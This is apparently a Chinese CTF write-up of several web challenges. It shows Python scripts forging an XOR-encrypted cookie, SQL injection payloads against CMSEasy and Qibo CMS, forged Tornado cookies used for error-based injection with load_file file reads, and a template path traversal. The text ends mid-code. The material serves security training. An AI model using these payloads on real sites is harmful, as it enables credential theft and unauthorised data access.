class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"><span class="variable">$length</span>, <span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hash</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$max</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++)	&#123;</span><br><span class="line">        <span class="variable">$hash</span> .= <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$max</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hash</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$txt</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$tmp</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$txt</span>[<span class="variable">$i</span>])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$rnd</span>=<span class="title function_ invoke__">random</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="variable">$key</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$rnd</span>.<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$s</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> == <span class="number">32</span>) <span class="variable">$s</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$ttmp</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[++<span class="variable">$s</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$rnd</span>.<span class="variable">$ttmp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$txt</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$txt</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$rnd</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$txt</span>,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$txt</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="variable">$key</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$rnd</span>.<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$s</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> == <span class="number">32</span>) <span class="variable">$s</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[++<span class="variable">$s</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$tmp</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$tmp1</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$tmp</span>[<span class="variable">$i</span>])-<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tmp1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">decrypt</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>],<span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&#x27;system&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="title function_ invoke__">encrypt</span>(<span class="string">&#x27;guest&#x27;</span>,<span class="variable">$key</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;â®(â¯â½â°)â­&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>wow ，好长的代码</p>
+<p>自定义了加解密函数和秘钥去设置Cookie 如果包含system则返回flag</p>
+<p>加密函数:</p>
+<p>对字符串置换与添加了4个随机字符的key进行异或</p>
+<p>获取flag思路</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 由置换后guest与cookie除去前<span class="number">4</span>位异或获取MD5后的前<span class="number">5</span>位key</span><br><span class="line"><span class="number">2</span>. 由system+key+<span class="number">1</span>位爆破 反推cookie</span><br><span class="line"><span class="number">3</span>. 获取flag</span><br></pre></td></tr></table></figure>
+
+<p>代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://fdb09252330c4580b0d9a36bca00562ac9f3773c00274287.game.ichunqiu.com/fl3g_ichuqiu.php&quot;</span></span><br><span class="line"></span><br><span class="line">cookie = requests.get(url).cookies[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"></span><br><span class="line">txt = base64.b64decode(cookie)</span><br><span class="line"></span><br><span class="line">rnd = txt[:<span class="number">4</span>]    <span class="comment"># 获取随机的字符串</span></span><br><span class="line">cstr = txt[<span class="number">4</span>:]   <span class="comment"># guest与key异或处理的字符串</span></span><br><span class="line"></span><br><span class="line">guest = <span class="built_in">list</span>(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;xxxxxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(guest)):</span><br><span class="line">    guest[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(guest[i])+<span class="number">10</span>) 		   <span class="comment"># 对guest置换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(guest)):</span><br><span class="line">	key[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(guest[i])^<span class="built_in">ord</span>(cstr[i]))   <span class="comment"># guest与cookie除去前4位异或得到key</span></span><br><span class="line">    </span><br><span class="line">system = <span class="built_in">list</span>(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(system)):  </span><br><span class="line">	system[x] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(system[x])+<span class="number">10</span>) 		   <span class="comment"># 对system置换</span></span><br><span class="line"></span><br><span class="line">letter = <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> letter:</span><br><span class="line">	key[<span class="number">5</span>] = ch                                <span class="comment"># 添加第六位key</span></span><br><span class="line">	sstr = newsc = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(system)):</span><br><span class="line">		sstr += <span class="built_in">chr</span>(<span class="built_in">ord</span>(system[x])^<span class="built_in">ord</span>(key[x])) <span class="comment"># 获取system与key异或字符串</span></span><br><span class="line">		</span><br><span class="line">	newc = rnd+sstr                             <span class="comment"># 随机字符串+system异或处理后</span></span><br><span class="line">    </span><br><span class="line">	<span class="built_in">print</span>(base64.b64encode(newc)) </span><br></pre></td></tr></table></figure>
+
+<p>得到一些Cookie添加到 burp intruder 爆破得到flag</p>
+<h2 id="YeaseCMS"><a href="#YeaseCMS" class="headerlink" title="YeaseCMS"></a>YeaseCMS</h2><p>新的CMS系统，帮忙测测是否有漏洞。</p>
+<p><em>|   tips:flag在网站根目录下的flag.php中</em></p>
+<p><strong>老规矩：</strong> </p>
+<ol>
+<li>第一步,肯定是要判断出cms类型 </li>
+<li>第二步,查询该cms曾经出现的漏洞 </li>
+<li>第三步,然后利用这些漏洞拿到flag.</li>
+</ol>
+<ul>
+<li>cms 类型</li>
+</ul>
+<p>复制一些标题去搜索  出现一片power by cmseasy </p>
+<ul>
+<li>漏洞</li>
+</ul>
+<p>有个经典的洞sql注入可获取admin的密码 <a target="_blank" rel="noopener" href="https://wooyun.shuimugan.com/bug/view?bug_no=137013">https://wooyun.shuimugan.com/bug/view?bug_no=137013</a></p>
+<p><code>http://cdc5de2889fb435d9a32aed6549e4ea4b05b165056c94414.game.ichunqiu.com/celive/live/header.php</code></p>
+<p>POST数据（利用updatexml报错）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax=<span class="title class_">Postdata</span>&amp;xajaxargs[<span class="number">0</span>]=<span class="language-xml"><span class="tag">&lt;<span class="name">xjxquery</span>&gt;</span><span class="tag">&lt;<span class="name">q</span>&gt;</span>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat%2528username%252C%2527%257C%2527%252Cpassword%2529%2529%2520from%2520yesercms_user%2529%252C20%252C64%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520<span class="tag">&lt;/<span class="name">q</span>&gt;</span><span class="tag">&lt;/<span class="name">xjxquery</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><code>ff512d4240cbbdeafada404677ccbe61</code> md5解密&#x3D;&gt; <code>Yeser231 </code></p>
+<p>admin 地址</p>
+<p><code>index.php?case=admin&amp;act=login&amp;admin_dir=admin&amp;site=default</code></p>
+<ul>
+<li>拿flag</li>
+</ul>
+<p>通常进入后台查找上传点，更改配置文件 获取webshell</p>
+<p>遍历访问了后台功能 发现没有上传点，配置文件不能成功连接</p>
+<p>有个地方模版编辑页面</p>
+<p><code>/index.php?case=template&amp;act=fetch&amp;admin_dir=admin&amp;site=default</code></p>
+<p>通过访问文件加载模板</p>
+<p>有参数<code>&amp;id=#ditu_html</code>更改为<code>&amp;id=../../flag.php</code>即可getflag</p>
+<hr>
+<h2 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2><p><em>| 后台有获取flag的线索</em></p>
+<p>X进后台？注入密码？</p>
+<p>胡乱提交一些字符，都返回flase</p>
+<p>抓个包，发现提交email[]&#x3D;1报错</p>
+<p>显示有<code>/var/www/html/rtiny/login.py</code></p>
+<p>果断搜索一波  github上有个xss平台的轮子 <code>https://github.com/r0ker/Rtiny-xss</code></p>
+<p>审计一番 login注入失败</p>
+<ul>
+<li>rtiny&#x2F;lock.py存在注入</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">		self.set_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="literal">True</span> <span class="keyword">not</span> <span class="keyword">in</span> [f <span class="keyword">in</span> self.get_argument(<span class="string">&quot;email&quot;</span>) <span class="keyword">for</span> f <span class="keyword">in</span> sql]:</span><br><span class="line">			row = db.ct(</span><br><span class="line">				<span class="string">&quot;manager&quot;</span>,</span><br><span class="line">				<span class="string">&quot;*&quot;</span>, <span class="string">&quot;username=&#x27;&quot;</span>+self.get_argument(<span class="string">&quot;email&quot;</span>)+<span class="string">&quot;&#x27; and password=&#x27;&quot;</span> + md5(self.get_argument(<span class="string">&#x27;pass&#x27;</span>))+<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> row:</span><br><span class="line">				self.set_secure_cookie(<span class="string">&quot;username&quot;</span>, row[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">				self.set_secure_cookie(<span class="string">&quot;password&quot;</span>, row[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">				self.write(<span class="string">&quot;true&quot;</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				self.write(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			self.write(<span class="string">&quot;false&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>py 本地模拟生成cookie</p>
+<p><em>| “cookie_secret” 来源于index.py</em></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"></span><br><span class="line">settings = &#123;</span><br><span class="line">	<span class="string">&quot;cookie_secret&quot;</span>: <span class="string">&quot;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">		self.write(<span class="string">&quot;hello word&quot;</span>)</span><br><span class="line">		self.set_secure_cookie(<span class="string">&#x27;username&#x27;</span>,<span class="string">&quot;&#x27;and extractvalue(1,concat(0x5c,(select password from manager limit 0,1)))-- &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_app</span>():</span><br><span class="line">	<span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">		(<span class="string">r&#x27;/&#x27;</span>,MainHandler),</span><br><span class="line">	],**settings)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app = make_app()</span><br><span class="line">	app.listen(<span class="number">8855</span>)</span><br><span class="line">	</span><br><span class="line">	tornado.ioloop.IOLoop.current().start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>py报错注入</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://127.0.0.1:8855&quot;</span></span><br><span class="line">cookie = requests.get(url1).cookies[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">cookie = <span class="string">&quot;username=&quot;</span>+cookie</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&quot;http://8c74580a0882443cb667f6e10b8b01d81f5b499723754efa.game.ichunqiu.com/lock&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;password=12345&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>:cookie&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url2,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">&quot;2|1:0|10:1523252402|8:username|76:J2FuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg1Yywoc2VsZWN0IHZlcnNpb24oKSkpKS0tIA==|aa6099fbe7bd96737bfeb5738b859581f27e47a82f2d5c9f3a8073abc6162653&quot;</span>  <span class="comment">// select version()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// OperationalError: (1105, &quot;XPATH syntax error: &#x27;\5.5.50-cll-lve&#x27;&quot;)</span></span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;2|1:0|10:1523252892|8:username|96:J2FuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg1Yywoc2VsZWN0ICogZnJvbSBtYW5hZ2VyIGxpbWl0IDAsMSkpKS0tIA==|c00dc32f88b563f18a06e52dc4276a9ef5d2b4b6cf94d605e91f19c34b9f0b64&quot;</span>   <span class="comment">// select * from manager</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// OperationalError: (1241, &#x27;Operand should contain 1 column(s)&#x27;)</span></span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;2|1:0|10:1523253492|8:username|104:J2FuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg1Yywoc2VsZWN0IHVzZXJuYW1lIGZyb20gbWFuYWdlciBsaW1pdCAwLDEpKSktLSA=|5c43c42ba85c6a4a6e01a8c394f25ccb015dcb5eb94039945717df49f828e45a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到用户名 ichuqiu</span></span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;2|1:0|10:1523253625|8:username|104:J2FuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg1Yywoc2VsZWN0IHBhc3N3b3JkIGZyb20gbWFuYWdlciBsaW1pdCAwLDEpKSktLSA=|433fa97ed7bd5229a43a1b510f61b900c2ba5814d11f549fe514021ad8967443&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 318a61264482e503090facfc4337207 （md5加密只有31位）</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">2</span>|<span class="number">1</span>:<span class="number">0</span>|<span class="number">10</span>:<span class="number">1523271553</span>|<span class="number">8</span>:username|<span class="number">128</span>:JyBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4NWMsKHN1YnN0cmluZygoc2VsZWN0IHBhc3N3b3JkIGZyb20gbWFuYWdlciBsaW1pdCAwLDEpLDIsMzIpKSkpLS0g|<span class="number">12</span>d9da9ce080731ac9ac8a5f085a11bfb269ad8f8fa248fe6a6eb759564af8dc</span><br><span class="line"></span><br><span class="line"><span class="comment">// 18a61264482e503090facfc4337207f</span></span><br><span class="line"><span class="comment">//得到密码  318a61264482e503090facfc4337207f  =&gt; Myxss623</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<ul>
+<li>寻找flag</li>
+</ul>
+<p><em>|  提交ichunqiu &#x2F; Myxss623  登录  n次失败，以为密码错误重来了好多次但没错啊，登录地方不对？&#x2F;admin试下</em></p>
+<p><em>|  最后发现ichuqiu 不是 ichu<strong>n</strong>qiu    ( Emmmmm 怪我太多情)</em></p>
+<p>进到后台file下 <code>f13g_ls_here.txt file	index.py rtiny themes</code></p>
+<p>通过sql那 **load_file()**读文件</p>
+<p>Payload: <code>&#39; and extractvalue(1,concat(0x5c,(load_file(0x2f7661722f7777772f68746d6c2f663133675f6c735f686572652e747874))))-- </code></p>
+<p>​      flag{72c6d9bd-ea6b-4421-a2ac-3e</p>
+<p>Payload :<code>&#39; and extractvalue(1,concat(0x5c,(substr((load_file(0x2f7661722f7777772f68746d6c2f663133675f6c735f686572652e747874)),20,64))))--   </code></p>
+<p>​       4421-a2ac-3ef026fc99ed}</p>
+<ul>
+<li>总结：<ul>
+<li>对参数进行增 删 改 -&gt; 暴露目标更多信息</li>
+<li>对代码审计寻找漏洞</li>
+<li>sql注入姿势</li>
+<li>猜测flag文件位置</li>
+<li>读写文件姿势</li>
+<li></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-再见CMS"><a href="#2-再见CMS" class="headerlink" title="2. 再见CMS"></a>2. 再见CMS</h2><ul>
+<li><p>查看CMS类型</p>
+<p>复制一些字段搜索，得出是齐博的 (有通过搜索备案号找到的)</p>
+</li>
+<li><p>寻找CMS漏洞</p>
+<p>挺多的关于注入</p>
+<p><em>|  <a target="_blank" rel="noopener" href="https://wooyun.shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;BugSearch%5Btitle%5D=&amp;BugSearch%5Bvendor%5D=%E9%BD%90%E5%8D%9ACMS&amp;BugSearch%5Bauthor%5D=&amp;BugSearch%5Bbug_type%5D=SQL%E6%B3%A8%E5%B0%84%E6%BC%8F%E6%B4%9E&amp;BugSearch%5Bbug_level_by_whitehat%5D=&amp;BugSearch%5Bbug_level_by_vendor%5D=&amp;BugSearch%5Brank_by_whitehat%5D=&amp;BugSearch%5Bbug_date%5D=&amp;page=1">https://wooyun.shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;BugSearch%5Btitle%5D=&amp;BugSearch%5Bvendor%5D=%E9%BD%90%E5%8D%9ACMS&amp;BugSearch%5Bauthor%5D=&amp;BugSearch%5Bbug_type%5D=SQL%E6%B3%A8%E5%B0%84%E6%BC%8F%E6%B4%9E&amp;BugSearch%5Bbug_level_by_whitehat%5D=&amp;BugSearch%5Bbug_level_by_vendor%5D=&amp;BugSearch%5Brank_by_whitehat%5D=&amp;BugSearch%5Bbug_date%5D=&amp;page=1</a></em></p>
+<p>简单说下其中一个如何产生的漏洞</p>
+<p><em>|  <a target="_blank" rel="noopener" href="https://wooyun.shuimugan.com/bug/view?bug_no=80259">https://wooyun.shuimugan.com/bug/view?bug_no=80259</a></em></p>
+<ol>
+<li>存在功能点是修改个人信息</li>
+</ol>
+<p><em>|  <a target="_blank" rel="noopener" href="http://c40c0af007c84d52bab1ab26b606f606f878c4ae3f734498.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2">http://c40c0af007c84d52bab1ab26b606f606f878c4ae3f734498.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2</a></em></p>
+<p> 相关参数</p>
+<p><em>| old_password&#x3D;admin&amp;truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;<a href="mailto:&#97;&#100;&#109;&#105;&#x6e;&#x40;&#49;&#x32;&#51;&#x2e;&#x63;&#x6f;&#109;">&#97;&#100;&#109;&#105;&#x6e;&#x40;&#49;&#x32;&#51;&#x2e;&#x63;&#x6f;&#109;</a>&amp;provinceid&#x3D;,address&#x3D;(select version()) where uid&#x3D;3%23</em></p>
+<ol>
+<li>CMS 对注入做了一些过滤</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$truename</span>=<span class="title function_ invoke__">filtrate</span>(<span class="variable">$truename</span>);</span><br><span class="line"><span class="variable">$idcard</span>=<span class="title function_ invoke__">filtrate</span>(<span class="variable">$idcard</span>);</span><br><span class="line"><span class="variable">$telephone</span>=<span class="title function_ invoke__">filtrate</span>(<span class="variable">$telephone</span>);</span><br><span class="line"><span class="variable">$address</span>=<span class="title function_ invoke__">filtrate</span>(<span class="variable">$address</span>);</span><br><span class="line"><span class="variable">$introduce</span>=<span class="title function_ invoke__">filtrate</span>(<span class="variable">$introduce</span>);</span><br><span class="line"><span class="variable">$homepage</span>=<span class="title function_ invoke__">filtrate</span>(<span class="variable">$homepage</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtrate</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//$msg = str_replace(&#x27;&amp;&#x27;,&#x27;&amp;amp;&#x27;,$msg);</span></span><br><span class="line">	<span class="comment">//$msg = str_replace(&#x27; &#x27;,&#x27;&amp;nbsp;&#x27;,$msg);</span></span><br><span class="line">	<span class="variable">$msg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$msg</span>);</span><br><span class="line">	<span class="variable">$msg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#39;&#x27;</span>,<span class="variable">$msg</span>);</span><br><span class="line">	<span class="variable">$msg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&amp;lt;&quot;</span>,<span class="variable">$msg</span>);</span><br><span class="line">	<span class="variable">$msg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&amp;gt;&quot;</span>,<span class="variable">$msg</span>);</span><br><span class="line">	<span class="variable">$msg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;   &amp;nbsp;  &amp;nbsp;&quot;</span>,<span class="variable">$msg</span>);</span><br><span class="line">	<span class="comment">//$msg = str_replace(&quot;\r&quot;,&quot;&quot;,$msg);</span></span><br><span class="line">	<span 